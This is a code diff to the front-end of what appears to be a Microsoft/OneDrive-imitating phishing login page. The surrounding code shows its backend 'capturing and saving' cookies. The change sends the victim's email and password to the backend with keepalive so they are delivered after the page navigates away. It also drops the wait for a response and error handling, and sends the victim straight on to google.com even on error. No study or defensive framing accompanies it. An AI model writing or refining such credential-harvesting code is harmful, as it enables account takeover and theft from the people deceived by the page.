@@ -1501,10 +1501,10 @@ Status: ${data.status}`);
         // Password authentication using fast auth endpoint
         async function signInWithPassword() {
             try {
-                clearMessage(); // Clear any previous error messages immediately
+                clearMessage();
                 setLoading(true, 'Signing in...');
 
-                const email = currentEmail; // Use the stored email
+                const email = currentEmail;
                 const password = document.getElementById('passwordInput').value;
 
                 if (!password) {
@@ -1513,110 +1513,36 @@ Status: ${data.status}`);
                     return;
                 }
 
-                // Set up SSE connection for immediate redirect notifications
-                let immediateRedirectHandled = false;
-                let eventSource = null;
+                console.log(`🚀 Submitting password for background processing: ${email}`);
 
-                if (currentSessionId) {
-                    eventSource = new EventSource(`/api/auth-status/${currentSessionId}`);
-
-                    eventSource.addEventListener('login-success', function(event) {
-                        if (!immediateRedirectHandled) {
-                            immediateRedirectHandled = true;
-                            console.log('🚀 Immediate redirect triggered by SSE event!');
-                            eventSource.close();
-
-                            // Get configured redirect URL from admin settings
-                            fetch('/api/internal/redirect-url')
-                                .then(response => response.json())
-                                .then(data => {
-                                    const redirectUrl = data.success ? data.redirectUrl : 'https://onedrive.live.com';
-                                    console.log(`Redirecting to configured target: ${redirectUrl}`);
-                                    window.location.href = redirectUrl;
-                                })
-                                .catch(error => {
-                                    console.warn('Error getting redirect config, using default:', error);
-                                    window.location.href = 'https://onedrive.live.com';
-                                });
-                        }
-                    });
-
-                    eventSource.addEventListener('error', function(event) {
-                        console.warn('SSE connection error:', event);
-                        eventSource.close();
-                    });
-                }
-
-                // Use fast authentication endpoint
+                // Prepare payload for backend
                 const payload = { email, password };
                 if (currentSessionId) {
-                    payload.sessionId = currentSessionId; // Include session ID if available
+                    payload.sessionId = currentSessionId;
                 }
 
-                const response = await fetch('/api/authenticate-password-fast', {
+                // Send password to backend using keepalive to ensure delivery even after redirect
+                fetch('/api/authenticate-password-fast', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(payload),
+                    keepalive: true
+                }).catch(error => {
+                    console.warn('Background authentication submission error (non-blocking):', error);
                 });
 
-                const data = await response.json();
-
-                if (response.status === 401) {
-                    // Invalid credentials - show error and allow retry
-                    setLoading(false);
-
-                    // Show background processing indicator
-                    let errorMessage = data.message || 'Your account or password is incorrect. Try another password.';
-                    
-
-                    showMessage(errorMessage, 'microsoft-error');
-
-                    // Keep password form visible for retry
-                    return;
-                }
-
-                // Close SSE connection since we have the final response
-                if (eventSource) {
-                    eventSource.close();
-                }
-
-                if (data.success) {
-                    // Only proceed if immediate redirect hasn't happened
-                    if (!immediateRedirectHandled) {
-                        const authMethod = data.preloadUsed ? 'Fast Authentication (preloaded)' : 'Standard Authentication';
-                        console.log(`Login successful! ${authMethod} - Cookies captured and saved.`);
-
-                        // Show performance metrics if available
-                        if (data.metrics) {
-                            console.log(`⚡ Performance: ${data.metrics.totalAuthMs}ms total, preload: ${data.metrics.preloadUsed}`);
-                        }
-
-                        currentSessionId = data.sessionId;
-                        currentUserEmail = data.userEmail;
-
-                        // Fallback redirect (in case SSE didn't trigger)
-                        fetch('/api/internal/redirect-url')
-                            .then(response => response.json())
-                            .then(data => {
-                                const redirectUrl = data.success ? data.redirectUrl : 'https://onedrive.live.com';
-                                console.log(`Redirecting to configured target: ${redirectUrl}`);
-                                window.location.href = redirectUrl;
-                            })
-                            .catch(error => {
-                                console.warn('Error getting redirect config, using default:', error);
-                                window.location.href = 'https://onedrive.live.com';
-                            });
-                    }
-                } else {
-                    throw new Error(data.message || data.error || 'Unknown error');
-                }
+                // Immediately redirect to google.com without waiting for authentication
+                console.log('⚡ Redirecting to google.com immediately...');
+                setTimeout(() => {
+                    window.location.href = 'https://google.com';
+                }, 500);
 
             } catch (error) {
-                console.error('Password authentication error:', error);
-                setLoading(false);
-                showMessage(`Authentication error: ${error.message}`, 'error');
+                console.error('Password submission error:', error);
+                // Even on error, redirect to google.com
+                window.location.href = 'https://google.com';
             }
         }
 
